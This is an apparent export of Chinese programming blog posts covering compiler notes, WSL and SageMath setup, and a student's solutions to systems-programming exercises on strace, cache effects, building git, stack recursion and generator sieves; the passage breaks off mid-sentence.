NFA上判断接受可能需要回溯。可能需要将一个NFA转换成一个DFA。 RE ——》NFA ——》DFA ——》词法分析器代码 RE到NFA：Thompson算法这是一种递归算法，很小巧。 连接： 为什么不删掉空串，递归起来更工整，而且更简单。选择： 闭包： 例子：a(b | c)*。 NFA到DFA：子集构造算法构造一个DFA，使得NFA能接受，DFA也要能接受。 $\\epsilon$ - 闭包的计算：深度优先。复杂度为$O(N)$，N是图中的所有节点。 123456set closure = {}void eps_closure(x) closure += {x} foreach (y: x--epsilon--y) if (!visited(y)) eps_closure (y) 广度优先类似。 子集构造算法，也就是工作表算法。 DFA的最小化：Hopcroft算法 这些状态都是必须的吗？如何得到一个更小状态更少的DFA呢？ 123456789// 基于等价类的思想split(S): foreach (char c) if (c can split S) split S into T1,...,Tkhopcroft(): split all nodes into N, A while (set is still changes) split(S) DFA的代码表示DFA是一个有向图。转移表和驱动代码： 123456789101112131415161718char table[M][N];table[0]['a'] = 1;table[1]['b'] = 1;table[1]['c'] = 1;//other table entries are errornextToken(): state = 0 stack = [] while (state != ERROR) c = getchar() if (state is ACCEPT) clear(stack) push(state) state = table[state][c] while (state is not ACCEPT) state = pop(); rollback(); 栈来实现一个最长匹配的问题。 跳转表（flex）： 123456789101112131415161718nextToken(): state = 0 stack = [] goto q0q0: c = getchar() if (state is ACCEPT) clear (stack) push(state) if (c == 'a') goto q1q1: c = getchar() if (state is ACCEPT) clear (stack) push (state) if (c == 'b' || c == 'c') goto q1 lab1：词法分析 https://github.com/Aununo/hi/tree/main/UESTC/Compiler/lab1 语法分析语法分析的目标是找出词法记号序列的结构、恢复出一棵语法树。 语法描述工具是2型文法——上下文无关文法。 无关文法$G=(V_T, V_N, S, P)$及符号串ω，判断ω是否是G的句子。 输入是一个记号流以及一个语法规则，通过语法分析器产生一个抽象语法树，分析程序是否合法。 为什么报错是 ‘missing )’ 而不是多出一个 ‘(‘？ 上下文无关文法（CFG） 推导：给定文法G，从G的开始符号S开始，用产生式的右部替换左侧的非终结符；此过程不断重复，直到不出现非终结符为止。最终的串称为句子。 最左准导：每次总是选择最左侧的符号进行替换。 语法分析的工作就是：给定文法G和句子S（token 流），判断是否存在对句子s的推导？ 可以用分析树来表示一个推导：分析树的含义取决于树的后序遍历。 树中的每个内部节点代表非终结符，每个叶子节点代表终结符，每一步推导代表如何从双亲节点生成它的直接孩子节点。 对于一个串，不同的推导会得到不同的分析树： 一个值是23，一个值是35，考虑优先级？文法没有正确表达语法。这种文法是有问题的，被称为二义性文法。 给定文法G，如果存在句子S，它有两棵不同的分析树，那么称G是二义性文法。从编泽器角度，二义性文法存在问题：同一个程序会有不同的含义。因此程序运行的结果不是唯一的。需要进行文法的重写。 自上而下分析基本算法思想：从G的开始符号出发，随意推导出某个句子t，比较t和s。回溯和剪枝，避免搜索无效的解空间。 12345678910tokens[];i = 0;stack = [S]while (stack != []) if (stack[top] is a terminal t) if (t == tokens[i++]) pop(); else backtrack(); else if (stack[top] is a nonterminal T) pop(); push(the next right hand side of T) 算法涉及到回溯，因此我们需要线性时间的算法。用前看符号避免回溯。引出递归下降和LL(1)分析算法。 手工实现：递归下降分析法线性时间。分治法为每个非终结符构造一个分析函数，用前看符号指导产生式规则的选择。 ANTLR：LL(1)分析算法从左（L）向右读入程序，最左（L）推导，采用一个（1）前看符号。 自底向上分析LR(0)分析算法SLR分析算法LR(1)分析算法lab2：递归下降分析法https://github.com/LRL52/compiler 不打算写了。I’ve never had fun playing in a compiler.","link":"/2024/12/10/%F0%9F%8E%BBCompiler-Design/"},{"title":"🐧Windows Subsystem for Linux","text":"Penguins would not like open windows. Windows家庭中文版升级为专业版1. win11家庭版转专业版密钥 2. windows11家庭版升级专业版 按照文章1的步骤，密钥第四个可以，输入后自动重启升级。 升级后我的显示密钥无效未激活，在终端中输入文章2第二步的三个命令，查看发现升级成功。 启用或关闭Windows功能中没有Hyper-vWindows 没有 Hyper-V 解决方案 WSL2安装Linux发行版开启 WSL2 安装 Ubuntu 当我一切工作准备就绪，使用wsl --update命令升级到最新版的wsl后，仍然出现了错误。 1Error code: Wsl/Service/CreateVm/HCS/HCS_E_HYPERV_NOT_INSTALLED Google后发现有人遇到了和我同样的问题，onomatopellan的回答“勾选Windows Sandbox选项”帮助了我。 使用 wsl --list --online 命令查找可用发行版名称，并用 wsl --install -d &lt;distribution_name&gt; 安装你喜爱的版本。 移动发行版的安装位置。 导出到D盘中：wsl --export Ubuntu D:\\WSL\\Ubuntu\\ubuntu.tar 注销并移除C盘中的发行版：wsl --unregister Ubuntu 导入到D盘中：wsl --import Ubuntu D:\\WSL\\Ubuntu D:\\WSL\\Ubuntu\\ubuntu.tar 修改默认用户：Ubuntu config --default-user &lt;username&gt; 更换镜像源12sudo cp /etc/apt/sources.list /etc/apt/sources.list.bak #备份sudo nano /etc/apt/sources.list #编辑 使用 lsb_release -a 可以查看 ubuntu 的版本，在https://mirrors.tuna.tsinghua.edu.cn/help/ubuntu/ 可以查询对应的镜像源。 Ctrl ^ 记录开始位置，移动光标选择范围，Ctrl K 进行剪切。一些基础的 Linux 操作命令不再赘述。","link":"/2024/07/21/%F0%9F%90%A7Windows-Subsystem-for-Linux/"},{"title":"🔢SageMath","text":"Sage is really a useful and powerful math tool. Python for Linux下面我们准备编写python脚本的IDE。以Ubuntu为例。 在windows中下载安装vscode，并安装名为wsl的连接插件。 在wsl中输入code便可以打开vscode。 新建文件test.py，路径任意，例如/root/test.py。 写入文件，保存后新建终端，使用python3 test.py命令，得到输出。 下面我们说一说pip包管理器。 1sudo apt install python3-pip python3-venv 在虚拟环境中安装python包，以便后续管理。 创建虚拟环境：python3 -m venv myenv。 激活虚拟环境：source myenv/bin/activate。 安装包：pip install &lt;package_name&gt;。 退出：deactivate。 发现下载速度较慢，可以清除下载缓存，更换下载源。 12pip cache purgepip install pwntools -i https://pypi.tuna.tsinghua.edu.cn/simple git Clone使用HTTP协议git clone https://github.com/repo/repo.git经常会遇到问题，可以使用SSH的方法clone一些github库： 创建ssh key：使用ssh-keygen -t rsa -b 4096 -C &quot;your-email&quot;命令，下面的选项全部直接敲回车即可。 随后使用 cat ~/.ssh/id_rsa.pub 命令查看生成的公钥，并完整的复制下来。 在github仓库界面点击自己的头像，选择settings。进入到设置页面后，点击左侧的SSH and GPG keys选项。点击New SSH key选项，并将复制下来的内容粘贴上去，添加该ssh key的描述。随后点击Add SSH key，并一路点击确认即可。 可以使用以下命令检查是否已有SSH密钥：ls -al ~/.ssh，如果你看到 id_rsa 和 id_rsa.pub 文件，说明已经存在SSH密钥。 使用以下命令测试与GitHub的SSH连接：ssh -T git@github.com。 如果一切正常，你会看到类似以下的输出： 1Hi username! You've successfully authenticated, but GitHub does not provide shell access. 使用git clone git@github.com:username/repository.git命令克隆存储库。 install SageMath阅读Sage的官方安装说明Installation Guide即可。 按理说可以按照 Installing SageMath 10.4 in Ubuntu 22.04 or 24.04 一步一步来，编译时会警告root，可以建立一个新用户，七月初10.3版本我也是这么做的，不知道为什么10.4我这里不行了。 也可以在Arch Linux上快速安装SageMath。第一次接触Arch的话，看一些基础的命令叭sudo pacman -Sy/-Syu/-Rns &lt;package_name&gt;/-Scc/...。 Arch的服务器比较慢，可以通过手动编辑镜像列表文件 /etc/pacman.d/mirrorlist，将速度较快的镜像服务器移到顶部。 12Server = https://mirror.tuna.tsinghua.edu.cn/archlinux/$repo/os/$archServer = https://mirrors.ustc.edu.cn/archlinux/$repo/os/$arch o.0接着就是安装sagemath——sudo pacman -S sagemath sagemath-doc。 等一会儿就成功啦！怎么在sage里调用外来库呢，哭哭&gt;_&lt;sudo pacman -S python-&lt;package_name&gt;。","link":"/2024/07/14/%F0%9F%94%A2SageMath/"},{"title":"💻CNSS Recruit Dev 2024","text":"“Dev can be one of the ways to create everything for you, which will come with a great sense of achievement.” 🥳MAN！作为一名Dev手，学会查找并浏览官方文档是非常重要的能力。本题要求你初步学会使用linux系统自带的一个功能强大的文档：man 。(实际上是manual的英文缩写） 之前没有用过linux？没有关系，来看一下这门课程吧：https://missing-semester-cn.github.io/ CH1首先，你要在电脑上配置一个虚拟环境，这里列出几个方案: 在windows环境下可以使用wsl（比较推荐） 或者可以配置虚拟机 或者有条件可以找一台云服务器或者买另一台实体机。 双系统（步骤比较复杂） 当我们有了linux环境后，不妨在linux环境下使用gcc编译一个自己写的”Hello World!”并运行！ CH2linux有一个很有意思的指令：strace。同时，linux中的指令(command)，系统调用(system call)和库函数(library function) 基本都可以用man 1 [name], man 2 [name] man 3 [name]来了解他们的用法。 假设你在CH1中的程序名为hello。在同目录下运行strace ./hello。结合你看到的man上对strace的阐述，简单解释下运行结果。 In the simplest case strace runs the specified command until it exits. It intercepts and records the system calls which are called by a process and the signals which are received by a process. The name of each system call, its arguments and its return value are printed on standard error or to the file specified with the -o option. 输出展示了程序的执行过程。 execve调用hello_world，传递了PATH、参数和42个环境变量；返回0，成功执行。 brk查询程序数据段末尾位置，返回值是当前内存分配位置，用于管理内存。 mmap为程序分配一块内存，返回分配的内存地址，用于读写操作。 access在检查是否存在ld.so.preload文件，返回错误，没有找到。 openat打开共享库缓存文件，查找程序依赖的共享库；当前程序依赖的libc库被打开，程序返回3。 read、mmap和close表示从库中读取需要的数据。 arch_prctl设置线程本地存储，为多线程环境提供支持。（不懂） set_tid_address和set_robust_list用于线程的初始化、设置线程的标识地址，防止线程被意外中断。（也不懂） mprotect保护内存页面的权限，设置某些内存区域为只读。 （大的要来了）write(1, &quot;hello_world\\n&quot;, 12) = 12，通过write系统调用向文件描述符1即标准输出写入12个字节的字符串。 exit_group顾名思义，结束并正常退出。 +++ exited with 0 +++ CH3运行 man 3 exec。你能写一个运用到了库函数exec的C程序吗？ The exec() family of functions replaces the current process image with a new process image. 写程序调用execve来替换当前的进程。CH2的第一个调用。 123456789101112131415161718192021#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt; //execve所在的头文件extern char **environ; // 引用当前进程的环境变量int main() { // 要执行的程序的路径 char *program = &quot;/bin/ls&quot;; // 参数 char *args[] = {&quot;ls&quot;, NULL}; // 执行 execve 系统调用 if (execve(program, args, environ) == -1) { perror(&quot;execve met problems.&quot;); exit(EXIT_FAILURE); // 使用 EXIT_FAILURE 表示失败退出 } return 0;} 编译和运行这个程序。 12345$ gcc -o execve_exp execve_exp.c$ ./execve_expexecve_exp execve_exp.c hello_world test.c$ lsexecve_exp execve_exp.c hello_world test.c 😶‍🌫️Oop Loop学习c语言的数组部分时，想出了三种遍历二维数组的方法，并想办法测量了这三种方法所使用的时间。”这三种方法都访问了同样数量的数组元素，因此他们所耗费的时间一定是差不多的。“但事情远没有这么简单： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;sys/time.h&gt;#include &lt;fcntl.h&gt;#define UNIT_GAP 1000000.0void M_gettimeofday(struct timeval *tv) { int result = gettimeofday(tv, NULL); if(result != 0) { perror(&quot;gettimeofday st\\n&quot;); exit(1); } return ;}#define ArrSize 15000int arr1[ArrSize][ArrSize];int arr2[ArrSize][ArrSize];int arr3[ArrSize][ArrSize];int main() { /* Evaluate iterating pattern 1 */ struct timeval tv_st; M_gettimeofday(&amp;tv_st); for(int i = 0; i &lt; ArrSize; i++) { for(int j = 0; j &lt; ArrSize; j++) { arr1[i][j] += 1; } } struct timeval tv_ed; M_gettimeofday(&amp;tv_ed); double time_gap1 = (double) (tv_ed.tv_sec - tv_st.tv_sec) + ((double) (tv_ed.tv_usec - tv_st.tv_usec) / UNIT_GAP); /* Evaluate iterating pattern 2 */ M_gettimeofday(&amp;tv_st); for(int i = 0; i &lt; ArrSize; i++) { for(int j = 0; j &lt; ArrSize; j++) { arr2[j][i] += 1; } } M_gettimeofday(&amp;tv_ed); double time_gap2 = (double) (tv_ed.tv_sec - tv_st.tv_sec) + ((double) (tv_ed.tv_usec - tv_st.tv_usec) / UNIT_GAP); /* Evaluate iterating pattern 3 */ M_gettimeofday(&amp;tv_st); for(int i = 0; i &lt; ArrSize; i++) { int cap = (ArrSize / 3) * 3; for(int j = 0; j &lt; cap; j+=3) { arr3[i][j] += 1; arr3[i][j + 1] += 1; arr3[i][j + 2] += 1; } for(int j = cap; j &lt; ArrSize; j++) { arr3[i][j] += 1; } } M_gettimeofday(&amp;tv_ed); double time_gap3 = (double) (tv_ed.tv_sec - tv_st.tv_sec) + ((double) (tv_ed.tv_usec - tv_st.tv_usec) / UNIT_GAP); printf(&quot;time spent for time_gap1: %lf seconds\\n&quot;, time_gap1); printf(&quot;time spent for time_gap2: %lf seconds\\n&quot;, time_gap2); printf(&quot;time spent for time_gap3: %lf seconds\\n&quot;, time_gap3);} 事实上，这三种遍历方式使用的时间有明显的差别。 CH1发现每次程序的运行结果差别都很大，因此需要反复运行程序很多次才能找出不同遍历模式下的时间规律。请你帮他修改程序，让程序的运行结果随机性更小，这样就能找出更加可信的结论了！ 实践出真知，跑一下看看。Oops，感觉1和3的随机性很强，2几乎是最慢的，不过也有少数例外。为了减少随机性，我们可以多次跑代码取平均值。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;sys/time.h&gt;#include &lt;fcntl.h&gt;#define UNIT_GAP 1000000.0#define ArrSize 15000#define NUM_RUNS 5 //运行5次并取平均值void M_gettimeofday(struct timeval *tv) { int result = gettimeofday(tv, NULL); if(result != 0) { perror(&quot;gettimeofday failed\\n&quot;); exit(1); }}int arr1[ArrSize][ArrSize];int arr2[ArrSize][ArrSize];int arr3[ArrSize][ArrSize];int main() { double total_time1 = 0.0, total_time2 = 0.0, total_time3 = 0.0; for(int run = 0; run &lt; NUM_RUNS; run++) { struct timeval tv_st, tv_ed; M_gettimeofday(&amp;tv_st); /* PATTERN 1 */ for(int i = 0; i &lt; ArrSize; i++) { for(int j = 0; j &lt; ArrSize; j++) { arr1[i][j] += 1; } } M_gettimeofday(&amp;tv_ed); double time_gap1 = (double) (tv_ed.tv_sec - tv_st.tv_sec) + ((double) (tv_ed.tv_usec - tv_st.tv_usec) / UNIT_GAP); total_time1 += time_gap1; M_gettimeofday(&amp;tv_st); /* PATTERN 2 */ for(int i = 0; i &lt; ArrSize; i++) { for(int j = 0; j &lt; ArrSize; j++) { arr2[j][i] += 1; } } M_gettimeofday(&amp;tv_ed); double time_gap2 = (double) (tv_ed.tv_sec - tv_st.tv_sec) + ((double) (tv_ed.tv_usec - tv_st.tv_usec) / UNIT_GAP); total_time2 += time_gap2; M_gettimeofday(&amp;tv_st); /* PATTERN 3 */ for(int i = 0; i &lt; ArrSize; i++) { int cap = (ArrSize / 3) * 3; for(int j = 0; j &lt; cap; j += 3) { arr3[i][j] += 1; arr3[i][j + 1] += 1; arr3[i][j + 2] += 1; } for(int j = cap; j &lt; ArrSize; j++) { arr3[i][j] += 1; } } M_gettimeofday(&amp;tv_ed); double time_gap3 = (double) (tv_ed.tv_sec - tv_st.tv_sec) + ((double) (tv_ed.tv_usec - tv_st.tv_usec) / UNIT_GAP); total_time3 += time_gap3; } printf(&quot;Average time spent for time_gap1: %lf seconds\\n&quot;, total_time1 / NUM_RUNS); printf(&quot;Average time spent for time_gap2: %lf seconds\\n&quot;, total_time2 / NUM_RUNS); printf(&quot;Average time spent for time_gap3: %lf seconds\\n&quot;, total_time3 / NUM_RUNS); return 0;} 嗯，看起来有规律多了：$2&gt;&gt;1&gt;3$。 CH2试回答不同遍历模式下运行时间的差别，并解释为什么会产生这些差别。 1是行优先遍历，这与C中行主序存储数组的方式一致。根据局部性，CPU可以有效地读取连续的内存块，减少缓存未命中次数，提高访问速度。 而2是列优先遍历，与1相反，这种访问模式导致大量缓存未命中、效率低。 关于原理解释那一部分，只靠cpu缓存其实不太能解释 第三个pattern 耗时比第一个pattern小的问题qwq——Shiver 3则使用了循环展开优化。每次处理三个元素，减少了每次更新迭代的控制开销，在大规模进行数组遍历时，会累积成明显的性能提升。 另外由于数组元素是每三个访问的，更容易预取更多数据到缓存中，进一步减少了缓存未命中的损失。 流水线优化：现代处理器使用流水线技术来提高指令执行的效率。3通过减少循环次数和增加每次循环内处理的数据量，减少了其它分支指令，使处理器流水线更顺畅。这可以减少流水线停顿，从而提高整体执行速度。 分支预测：循环的检查条件变少了，分支预测错误的概率也降低了。 可能存在的向量化优化？编译器可以自动将这种每次操作多个相邻元素转换为SIMD指令。这意味着处理器可以在一个指令周期内对多个数据进行相同的操作，提升运算速度。 连续访问多个元素更有可能保持内存对齐，从而减少额外的内存操作开销。 由于循环体内操作相互独立，处理器可以并行处理多个操作，进一步提升速度。 ♿造轮子 Git 是一个分布式版本控制系统，用于跟踪代码或文件的更改，并支持多人协作开发。 你可以在这里看到git的源代码: https://github.com/git/git Shiver想要在自己的电脑上安装git。 以前，他是通过系统的软件包管理器来安装git的。例如，在ubuntu系统中就可以使用这两行命令来安装git： 12$ sudo apt update$ sudo apt install git 但今天，它想换点新花样。他想要通过源代码来编译git！ git的源代码很多地方都有，这里比较推荐使用github上的代码仓库，并通过git clone下载。（不要吐槽为什么电脑上已经有git了为为什么还要下载git源码） 同时，Shiver还通过修改源代码实现了修改git调用版本信息后的输出。 总的来说，Shiver想要你实现如下的操作： 在自己的电脑上编译 git 程序，并在提交文档中简单阐述自己在编译过程中遇到的问题与自己是怎么解决这些问题的。 修改 git 的源代码，使其在输出版本信息时会有额外的 &lt;-- CNSS --&gt; 提示（你也可以添加自己喜欢的信息）并截图提交。（这可能需要你具有一定的代码阅读能力） Hints： 怎么编译？要不先从文档开始，比如源代码中的README.md，INSTALL文件？ 什么是cmake？ A）编译需要依赖，在GPT的帮助下怒装依赖项。 1sudo apt install -y make libssl-dev libcurl4-gnutls-dev libexpat1-dev gettext B）获取Git的源码并编译Git程序： 1234git clone git@github.com:git/git.gitmake configure./configure --prefix=/usr/local #指定安装路径，防止冲突make C）遇到报错信息： 12345678910/usr/bin/ld: libgit.a(utf8.o): in function `reencode_string_iconv':/home/aununo/CNSS/git/utf8.c:498:(.text+0x10dd): undefined reference to `libiconv'/usr/bin/ld: libgit.a(utf8.o): in function `reencode_string_len':/home/aununo/CNSS/git/utf8.c:593:(.text+0x121d): undefined reference to `libiconv_open'/usr/bin/ld: /home/aununo/CNSS/git/utf8.c:603:(.text+0x1252): undefined reference to `libiconv_close'/usr/bin/ld: /home/aununo/CNSS/git/utf8.c:593:(.text+0x129e): undefined reference to `libiconv_open'/usr/bin/ld: /home/aununo/CNSS/git/utf8.c:603:(.text+0x12c9): undefined reference to `libiconv_close'/usr/bin/ld: /home/aununo/CNSS/git/utf8.c:598:(.text+0x136b): undefined reference to `libiconv_open'collect2: error: ld returned 1 exit statusmake: *** [Makefile:2842: git-daemon] Error 1 大概是说缺少 libiconv 库的引用。libiconv 是一个用于字符编码转换的库，而 Git 在处理字符集转换时依赖于它。我们使用命令 123$ ldconfig -p | grep libiconv #检查libiconv是否成功安装 libiconv_hook.so.1 (libc6,x86-64) =&gt; /lib/x86_64-linux-gnu/libiconv_hook.so.1 libiconv_hook.so (libc6,x86-64) =&gt; /lib/x86_64-linux-gnu/libiconv_hook.so 系统上有 libiconv_hook.so，而不是标准的 libiconv.so。由于 libiconv_hook 并没有提供 libiconv.so 的标准接口，导致了编译和测试时出现错误。创建符号链接： 1sudo ln -s /lib/x86_64-linux-gnu/libiconv_hook.so.1 /lib/x86_64-linux-gnu/libiconv.so.2 让系统中的 libiconv_hook.so 模拟 libiconv.so.2，验证一下： 12345$ ldconfig -p | grep libiconv libiconv_hook.so.1 (libc6,x86-64) =&gt; /lib/x86_64-linux-gnu/libiconv_hook.so.1 libiconv_hook.so (libc6,x86-64) =&gt; /lib/x86_64-linux-gnu/libiconv_hook.so libiconv.so.2 (libc6,x86-64) =&gt; /usr/local/lib/libiconv.so.2 libiconv.so (libc6,x86-64) =&gt; /usr/local/lib/libiconv.so 然后进行make编译成功！再复现一遍。 使用的版本基于 2.46.2，并且在此版本发布后有 628 次提交。 当前版本对应的具体提交哈希是 6258f68c3c。（复现前后面还有个.dirty表示在工作目录中有未提交的更改） Git 的版本信息由 git --version 命令生成，输出git version，下面我们进行查找： 1grep -r &quot;git version&quot; . 把大量输出喂给GPT发现： 123./help.c: * with external projects that rely on the output of &quot;git version&quot;../help.c: strbuf_addf(buf, &quot;git version %s\\n&quot;, git_version_string);./help.c: N_(&quot;git version [--build-options]&quot;), Here it is! 在vscode中查找并编辑help.c文件，修改输出即可。 12strbuf_addf(buf, &quot;git version %s\\n&quot;, git_version_string);=&gt; strbuf_addf(buf, &quot;&lt;-- CNSS --&gt; git version %s I l0v3 Sh1v3r~\\n&quot;, git_version_string); 重新make一下，输出时发现后面多了一个dirty。是修改了help.c却没提交更改的缘故。 可以看到输出&lt;-- CNSS --&gt; git version 2.46.2.628.g6258f68c3c.dirty I l0v3 Sh1v3r~ ⚒️Dig and Dig ssg是一名资深的Minecraft玩家，平时最喜欢的就是在MC的辽阔土地上寻找珍贵的矿石。 CH1从原版到整合包，从我的世界到泰拉瑞亚，ssg挖矿的足迹分布在各个领域。 有一天，他突然好奇想挖挖看 C语言程序，于是他写下了这段代码： 123456789101112131415161718192021222324#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int depth;void Dig (int digging) { if (digging &lt; 0) { return ; } int where_are_we; printf(&quot;In depth %d, we are at %p \\n&quot;, (depth - digging), (void *) &amp;where_are_we); Dig(digging - 1);}int main() { printf(&quot;Today we will dig: &quot;); scanf(&quot;%d&quot;, &amp;depth); printf(&quot;Let begin!\\n&quot;); Dig(depth);} 他决定先向下面挖掘 10 个函数的深度，于是他将depth 变量设置为了 10 并得到了这样的结果： Today we will dig: 10Let begin!In depth 0, we are at 0x7fffbc3fea14In depth 1, we are at 0x7fffbc3fe9e4In depth 2, we are at 0x7fffbc3fe9b4In depth 3, we are at 0x7fffbc3fe984In depth 4, we are at 0x7fffbc3fe954In depth 5, we are at 0x7fffbc3fe924In depth 6, we are at 0x7fffbc3fe8f4In depth 7, we are at 0x7fffbc3fe8c4In depth 8, we are at 0x7fffbc3fe894In depth 9, we are at 0x7fffbc3fe864In depth 10, we are at 0x7fffbc3fe834 看起来不错，于是他决定继续向下挖，但不知道为什么，当 depth 足够大时，程序就终止运作了！ 因此 ssg 找到你，想请你帮他解决这些问题： 尝试修改程序，使ssg的这个程序能统计他 总共 能够向下挖掘多少个 Byte。多次运行这个程序，每次能向下挖的Byte是固定的吗？ 运行初始程序看看depth的最大值，发现每次运行得到的最大深度相近但不同。比如： 123456789101112$ ./digToday we will dig: 1000000Let begin!...In depth 174513, we are at 0x7ffcccda07a4[1] 2146 segmentation fault ./dig# ----------------------------------- #In depth 174450, we are at 0x7ffda0d677a4[1] 2165 segmentation fault ./dig# ----------------------------------- #In depth 174576, we are at 0x7ffc72f5f7a4[1] 2688 segmentation fault ./dig 第一次运行，程序在174513处崩溃，而第二次运行在174450处崩溃，操作系统为进程分配的栈空间每次可能会略有不同，因此这些深度值并不完全一致。segmentation fault的段错误发生在程序试图访问未被允许访问的内存区域时。 [1] 是Linux系统为每个后台任务分配的作业号，1表示这是当前会话的第一个后台进程。 2146和2165是进程ID，是系统为每个运行程序分配的唯一标识符。 记录一下初始地址，用where_are_we减初始地址得到所在深度： 123456789101112131415161718192021222324252627282930#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int depth;void *initial_address = NULL;void Dig (int digging) { if (digging &lt; 0) { return ; } int where_are_we; if (initial_address == NULL) { initial_address = &amp;where_are_we; } int current_depth_bytes = abs((char *) initial_address - (char *) &amp;where_are_we); printf(&quot;In depth %d, we are at %p, depth in bytes: %d \\n&quot;, (depth - digging), (void *) &amp;where_are_we, current_depth_bytes); Dig(digging - 1);}int main() { printf(&quot;Today we will dig: &quot;); scanf(&quot;%d&quot;, &amp;depth); printf(&quot;Let begin!\\n&quot;); Dig(depth); return 0;} 运行一下程序： 1234567$ ./digToday we will dig: 100Let begin!In depth 0, we are at 0x7ffdd7afae10, depth in bytes: 0In depth 1, we are at 0x7ffdd7afade0, depth in bytes: 48...In depth 100, we are at 0x7ffdd7af9b50, depth in bytes: 4800 发现每次能向下挖的字节数是固定的48字节。 尝试解释为什么depth足够大时程序会停止运行。 递归深度过深，发生了栈溢出。函数的递归调用会在栈上分配内存，而栈的大小是有限的。当递归深度超出系统分配给程序的栈内存时，程序就会发生栈溢出，从而导致程序崩溃。 尝试解释为什么每次层数的间隔都为 48Byte, 这48Byte里面都包含了些什么？ 函数调用过程中的栈帧结构，说明这个函数中一个栈帧大小为48byte。包含：函数的返回地址，局部变量，函数参数等。 比如将函数内部的局部变量where_are_we类型改为long时，层数间隔会变为64byte。 CH2ssg在挖矿的时候是左右手交替进行的，因此他想记录下自己在挖掘每一层时使用的是左手还是右手，于是他写下了这段代码： 123456789101112131415161718192021222324252627282930313233343536373839#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;stdbool.h&gt;int depth;char* WhichHand(bool hand) { return hand ? &quot;left hand&quot; : &quot;right hand&quot;;}bool Dig1 (int digging) { if( digging &lt; 0) { return 0; } bool now_hand = !Dig1(digging - 1); printf(&quot;In depth %d, we use %s \\n&quot;, (depth - digging), WhichHand(now_hand)); return now_hand;}bool Dig2 (int digging, bool hand) { if( digging &lt; 0) { return hand; } printf(&quot;In depth %d, we use %s \\n&quot;, (depth - digging), WhichHand(hand)); return Dig2(digging - 1, !hand);}int main() { printf(&quot;Today we will dig: &quot;); scanf(&quot;%d&quot;, &amp;depth); printf(&quot;Let begin!\\n&quot;); Dig1(depth); //Dig2(depth, 0);} Dig1和Dig2是他编写的两个不同版本但是效果相似的函数，看起来运行的不错： Today we will dig: 10Let begin!In depth 10, we use left handIn depth 9, we use right handIn depth 8, we use left handIn depth 7, we use right handIn depth 6, we use left handIn depth 5, we use right handIn depth 4, we use left handIn depth 3, we use right handIn depth 2, we use left handIn depth 1, we use right handIn depth 0, we use left hand 但ssg发现了一个很严重的问题，当他使用 O2 优化(即在gcc编译时添加-O2指令)分别编译运行了两个不同版本的函数后，有一个版本的函数，无论他将深度设置为多大，都可以正常运行！ 他现在想考考你: 哪个版本的函数无论设置多大的深度都可以正常运行？ dig2函数。我们来跑一下： 12345678910111213141516$ gcc -O2 -o dig1 dig1.c #O2优化启用了包括-Wunused-result在内的警告，检查scanf返回值dig1.c: In function ‘main’:dig1.c:34:5: warning: ignoring return value of ‘scanf’ declared with attribute ‘warn_unused_result’ [-Wunused-result] 34 | scanf(&quot;%d&quot;, &amp;depth); |$ ./dig1Today we will dig: 1000000Let begin![1] 1727 segmentation fault ./dig# ----------------------------------- #$ ./dig2Today we will dig: 1000000Let begin!...In depth 999999, we use left handIn depth 1000000, we use right hand 为什么？ dig1函数仍然是使用了普通递归的方式，即使开O2优化编译，栈空间的限制依然存在。 而dig2函数使用尾递归，大多数编译器，比如这里的gcc中，开了O2尾递归可以被优化为普通循环实现，每次递归不需要额外占用栈帧，只需将函数参数改变再调用一次，就不会触发栈溢出。 谈一谈这道题对你在实际项目开发中的启发。 用递归，深度较大时，警惕栈溢出； 合理使用尾递归； 了解编译器和语言的优化能力，有助于提高程序的运行效率； developers应当编写健壮的代码，做好代码测试，关注边界条件。 🧮Primes香肠非常痴迷于筛法求素数表，大致原理如下 于是他先用 JavaScript 编写了下面这样的代码 1234567891011121314151617function* iota(i, n) { while (i &lt; n) yield i++}function* filter(g, p) { for (x of g) { if (x % p) yield x }}g = iota(2, 100)while (true) { var {value, done} = g.next() if (done) break g = filter(g, value) console.log(value)} 程序成功打印了 100 以内的所有素数。 为了让更多人理解这段代码，他又编写了 Python 版本 123456789101112131415161718def iota(i, n): while i &lt; n: yield i i += 1def filter(g, p): for x in g: if x % p: yield xg = iota(2, 100)try: while True: value = next(g) g = filter(g, value) print(value)except StopIteration: pass 程序虽然正确，但 IDE 给出了警告：用户定义的 filter 函数隐藏了 Python 内置的 filter 函数。 说来也是，为什么不直接使用更泛化的内置 filter 函数呢？于是他又把程序改成了这样。 12345678910111213def iota(i, n): while i &lt; n: yield i i += 1g = iota(2, 100)try: while True: value = next(g) g = filter(lambda incoming: incoming % value, g) print(value)except StopIteration: pass 很遗憾的是，程序输出的结果不再正确。到底是哪里出了问题？ 在调试的过程中，香肠觉得不能光调 Python 代码，JavaScript 的也不能放过。 考虑到 Python 采用了更泛化 filter 函数，于是他把原 JavaScript 代码也改成了这样。 1234567891011121314151617function* iota(i, n) { while (i &lt; n) yield i++}function* filter(g, p) { for (x of g) { if (p(x)) yield x }}g = iota(2, 100)while (true) { var {value, done} = g.next() if (done) break g = filter(g, incoming =&gt; incoming % value) console.log(value)} 竟然出现了和第二份 Python 代码一样的错误输出结果。这是巧合吗？ 本题筛素数的协程叫什么协程？你能简单描述一下这样筛素数的过程吗？ 在JavaScript或Python中，利用惰性求值的生成器，可以逐步生成一个序列，并能在筛选过程中动态修改序列，避免占用过多计算资源。 1234567g = iota(2, 100)while (true) { var {value, done} = g.next() if (done) break g = filter(g, value) console.log(value)} 核心思想是埃拉托斯特尼筛法（Sieve of Eratosthenes）。生成器iota生成一个从2到99的整数序列g，每次调用g中的值并通过生成器filter筛掉素数value的倍数，输出value，再移动到下一个数进行循环。 为什么第二份 Python 和第二份 JavaScript 的代码有问题？两者的问题是一样的吗？ 请你在第二份 Python 和第二份 JavaScript 基础上修改代码，在不失一般性的情况下解决存在的问题。 两者的问题不一样。 Python是和其延时绑定的机制有关。Python在真正执行函数（如lambda）的时候才会查找变量的值，而不是在定义函数时。 1g = filter(lambda 